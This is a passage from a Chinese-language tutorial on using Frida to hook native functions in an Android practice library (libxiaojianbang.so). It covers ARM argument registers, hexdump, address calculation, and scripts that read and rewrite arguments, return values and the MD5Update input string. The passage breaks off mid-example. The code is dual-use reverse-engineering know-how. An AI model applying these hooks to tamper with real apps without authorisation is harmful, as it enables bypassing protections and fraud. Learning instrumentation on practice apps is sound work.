<p>Interceptor通过inlinehook的方式拦截代码执行，会修改被Hook处的16个字节</p>
<p>需要注意的时，Java native层的函数，前两个参数是 JNIEnv*,jcalss(静态)&#x2F;jobject(实例)，后面的参数就是Java层中声明时对应的函数。</p>
<p>arm64中使用x0-x7来传递参数，如果参数数量多于8个，则需要从栈中获取(实际上传参还得考虑浮点寄存器，w开头的32位寄存器；另外arm32中是使用r0-r3寄存器来传递参数，超出的同样入栈)</p>
<p>arm64使用x0或w0寄存器存放函数返回值，arm32使用r0,r0如果放不下，则会使用r1</p>
<p>接下来来看看hexdump的源码</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">function</span> <span class="title function_">hexdump</span>(<span class="params">target: <span class="built_in">ArrayBuffer</span> | NativePointerValue, options?: HexdumpOptions</span>): string;</span><br><span class="line">interface <span class="title class_">HexdumpOptions</span> &#123;</span><br><span class="line">    offset?: number;	<span class="comment">//从给定的target偏移一定字节数开始dump，默认为0</span></span><br><span class="line">    length?: number;	<span class="comment">//指定dump的字节数，注意需要十进制的数值，默认16*16</span></span><br><span class="line">    header?: boolean;	<span class="comment">//返回的string中是否包含标题，默认为true</span></span><br><span class="line">    ansi?: boolean;	<span class="comment">//返回的string是否带(颜色?)，默认为false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用实例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> data = <span class="title function_">hexdump</span>(soAddr, &#123;<span class="attr">length</span>: <span class="number">16</span>, <span class="attr">header</span>: <span class="literal">false</span>&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line"><span class="comment">//  74c6c39000  7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  .ELF............</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> data = <span class="title function_">hexdump</span>(soAddr, &#123;<span class="attr">offset</span>: <span class="number">4</span>, <span class="attr">length</span>: <span class="number">16</span>, <span class="attr">header</span>: <span class="literal">false</span>&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line"><span class="comment">//  74c6c39004  02 01 01 00 00 00 00 00 00 00 00 00</span></span><br></pre></td></tr></table></figure>

<h3 id="Hook-so层任意函数"><a href="#Hook-so层任意函数" class="headerlink" title="Hook so层任意函数"></a>Hook so层任意函数</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">class</span> <span class="title class_">Module</span> &#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">findBaseAddress</span>(<span class="attr">name</span>: string): <span class="title class_">NativePointer</span> | <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">static</span> <span class="title function_">getBaseAddress</span>(<span class="attr">name</span>: string): <span class="title class_">NativePointer</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用实例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line"><span class="comment">//Module.getBaseAddress(&quot;libxiaojianbang.so&quot;)</span></span><br><span class="line"><span class="comment">//soAddr:  0x7b2e6c0000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> funcAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x1ACC</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//NativePointer源码</span></span><br><span class="line"></span><br><span class="line">declare <span class="keyword">class</span> <span class="title class_">NativePointer</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">v: string | number | UInt64 | Int64 | NativePointerValue</span>);</span><br><span class="line"><span class="title function_">add</span>(<span class="attr">v</span>: <span class="title class_">NativePointerValue</span> | <span class="title class_">UInt64</span> | <span class="title class_">Int64</span> | number | string): <span class="title class_">NativePointer</span>;</span><br><span class="line">......  <span class="comment">//constructor是NativePointer的构造函数，可以用new NativePointer(...)的方式吧数值，字符串等类型转为NativePointer类型；ptr &lt;=&gt; new NativePointer</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">var</span> soAddr = <span class="number">0x77ab999000</span>;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="title function_">ptr</span>(soAddr).<span class="title function_">add</span>(<span class="number">0x1A0C</span>) );  <span class="comment">// ptr &lt;=&gt; new NativePointer</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> sub_1A0C = soAddr.<span class="title function_">add</span>(<span class="number">0x1ACC</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_1ACC, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_1ACC onEnter args[0]: &quot;</span>, args[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_1ACC onEnter args[1]: &quot;</span>, args[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_1ACC onEnter args[2]: &quot;</span>, args[<span class="number">2</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_1ACC onEnter args[3]: &quot;</span>, args[<span class="number">3</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_1ACC onEnter args[4]: &quot;</span>, args[<span class="number">4</span>]);</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_1ACC onLeave retval: &quot;</span>, retval);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//sub_1ACC onEnter args[0]:  0x7bc3bd66c0</span></span><br><span class="line"><span class="comment">//sub_1ACC onEnter args[1]:  0x7fda079fb4</span></span><br><span class="line"><span class="comment">//sub_1ACC onEnter args[2]:  0x5</span></span><br><span class="line"><span class="comment">//sub_1ACC onEnter args[3]:  0x6</span></span><br><span class="line"><span class="comment">//sub_1ACC onEnter args[4]:  0x7</span></span><br><span class="line"><span class="comment">//sub_1ACC onLeave retval:  0x12</span></span><br></pre></td></tr></table></figure>

<p>当然了，函数地址也是可以手算的：</p>
<ol>
<li>thumb指令下：so文件基址+函数地址相对so文件的偏移量+1</li>
<li>ARM指令下：so文件基址+函数地址相对so文件的偏移量</li>
</ol>
<p>如何判断是thumb还是arm:</p>
<p>thumd的opcode是两个字节，arm是4个字节</p>
<p>当然了，其实32位的基本是thumb，64位基本是arm</p>
<h3 id="获取指针参数返回值"><a href="#获取指针参数返回值" class="headerlink" title="获取指针参数返回值"></a>获取指针参数返回值</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MD5Final</span> = soAddr.<span class="title function_">add</span>(<span class="number">0x3A78</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">MD5Final</span>, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">args1</span> = args[<span class="number">1</span>];</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7ffc689cc8  41 be f1 ce 7f dc 3e 42 c0 e5 d9 40 ad 74 ac 00  A.....&gt;B...@.t..</span></span><br><span class="line"><span class="comment">//logcat中的输出结果</span></span><br><span class="line"><span class="comment">//CMD5 md5Result: 41bef1ce7fdc3e42c0e5d940ad74ac00</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="Frida-inlineHook获取函数执行结果（hook精确到某一条指令，这个需要找到在so文件中的偏移量）"><a href="#Frida-inlineHook获取函数执行结果（hook精确到某一条指令，这个需要找到在so文件中的偏移量）" class="headerlink" title="Frida inlineHook获取函数执行结果（hook精确到某一条指令，这个需要找到在so文件中的偏移量）"></a>Frida inlineHook获取函数执行结果（hook精确到某一条指令，这个需要找到在so文件中的偏移量）</h3><p>两个实例</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hookAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1AF4</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(hookAddr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter x8: &quot;</span>, <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x8</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter x9: &quot;</span>, <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x9</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onLeave x0: &quot;</span>, <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>.<span class="title function_">toInt32</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">onEnter x8:  11</span></span><br><span class="line"><span class="comment">onEnter x9:  7</span></span><br><span class="line"><span class="comment">onLeave x0:  18</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hookAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1FF4</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(hookAddr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter: &quot;</span>, <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter: &quot;</span>, <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>));</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">onEnter:  0x7d9016ae80</span></span><br><span class="line"><span class="comment">7d9016ae80  78 69 61 6f 6a 69 61 6e 62 61 6e 67 00 00 c0 41  xiaojianbang...A</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="Frida修改函数参数与返回值"><a href="#Frida修改函数参数与返回值" class="headerlink" title="Frida修改函数参数与返回值"></a>Frida修改函数参数与返回值</h3><ol>
<li>修改函数参数和返回值</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> addFunc = soAddr.<span class="title function_">add</span>(<span class="number">0x1ACC</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addFunc, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        args[<span class="number">2</span>] = <span class="title function_">ptr</span>(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//this.context.x2 = 100;</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(retval.<span class="title function_">toInt32</span>());</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">100</span>);</span><br><span class="line"><span class="comment">//this.context.x0 = 100;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">args[2]:  100</span></span><br><span class="line"><span class="comment">retval:  113</span></span><br><span class="line"><span class="comment">//logcat中的输出为</span></span><br><span class="line"><span class="comment">//CADD addResult: 100</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是args[2] &#x3D; ptr(100);这一条语句，因为args是NativePointer类型的数组，故只接受NativePinter类型的值，除次方法外，也可以用this.context.x2&#x3D;100的直接修改寄存器的值方式来修改。</p>
<p>onLeave中新增了replace方法，直接修改返回值</p>
<ol>
<li>字符串修改</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">MD5Update</span> = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">MD5Update</span>, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(args[<span class="number">1</span>]));  <span class="comment">//hexdump用于从给定的地址开始，dump一段内存</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7ad0ca9f40  78 69 61 6f 6a 69 61 6e 62 61 6e 67 00 00 c0 41  xiaojianbang...A</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">7ad042e000  80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span><br><span class="line"><span class="comment">44</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">7fda079e50  60 00 00 00 00 00 00 00 ed 17 ae 39 cf 5d 07 be  `..........9.]..</span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">//logcat中的输出结果</span></span><br><span class="line"><span class="comment">//CMD5 md5Result: 41bef1ce7fdc3e42c0e5d940ad74ac00</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBytes</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">hexToBytes</span>(<span class="title function_">stringToHex</span>(str));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToHex</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> str.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">c</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;0&quot;</span> + c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>).<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">slice</span>(-<span class="number">2</span>);</span><br><span class="line">    &#125;).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> bytes = [], c = <span class="number">0</span>; c &lt; hex.<span class="property">length</span>; c += <span class="number">2</span>)</span><br><span class="line">        bytes.<span class="title function_">push</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(c, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改char*指向的地址内存数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MD5Update</span> = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">MD5Update</span>, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>() == <span class="string">&quot;xiaojianbang&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">let</span> newStr = <span class="string">&quot;xiaojian\0&quot;</span>;</span><br><span class="line">             args[<span class="number">1</span>].<span class="title function_">writeByteArray</span>(<span class="title function_">stringToBytes</span>(newStr));</span><br><span class="line">             <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(args[<span class="number">1</span>]));</span><br><span class="line">             args[<span class="number">2</span>] = <span class="title function_">ptr</span>(newStr.<span class="property">length</span> - <span class="number">1</span>);<span class="comment">//减一是因为&quot;\0&quot;占了一个，特别注意修改的字符串长度别大于原字符串</span></span><br><span class="line">             <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7b2e35bf50  78 69 61 6f 6a 69 61 6e 00 61 6e 67 00 00 c0 41  xiaojian.ang...A</span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">//logcat中的输出结果</span></span><br><span class="line"><span class="comment">//CMD5 md5Result: 66b0451b7a00d82790d4910a7a3a4162</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将内存中已有的字符串赋值给参数</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MD5Update</span> = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> strAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x3CFD</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">MD5Update</span>, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>() == <span class="string">&quot;xiaojianbang&quot;</span>)&#123;</span><br><span class="line">            args[<span class="number">1</span>] = strAddr;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(args[<span class="number">1</span>]));</span><br><span class="line">            args[<span class="number">2</span>] = <span class="title function_">ptr</span>(strAddr.<span class="title function_">readCString</span>().<span class="property">length</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">7ae6787cfd  63 6f 6d 2f 78 69 61 6f 6a 69 61 6e 62 61 6e 67  com/xiaojianbang</span></span><br><span class="line"><span class="comment">7ae6787d0d  2f 6e 64 6b 2f 4e 61 74 69 76 65 48 65 6c 70 65  /ndk/NativeHelpe</span></span><br><span class="line"><span class="comment">7ae6787d1d  72 00 65 6e 63 6f 64 65 00 28 29 4c 6a 61 76 61  r.encode.()Ljava</span></span><br><span class="line"><span class="comment">33</span></span><br><span class="line"><span class="comment">//logcat中的输出结果</span></span><br><span class="line"><span class="comment">//CMD5 md5Result: f6190c61b22ec8efe63fade2c47d8a49</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//stringToBytes函数的定义，参考上一小节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改MD5_CTX结构体中的buffer和count</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MD5Update</span> = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">MD5Update</span>, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">args0</span> = args[<span class="number">0</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">args1</span> = args[<span class="number">1</span>];</span><br><span class="line">    &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">args1</span>.<span class="title function_">readCString</span>() == <span 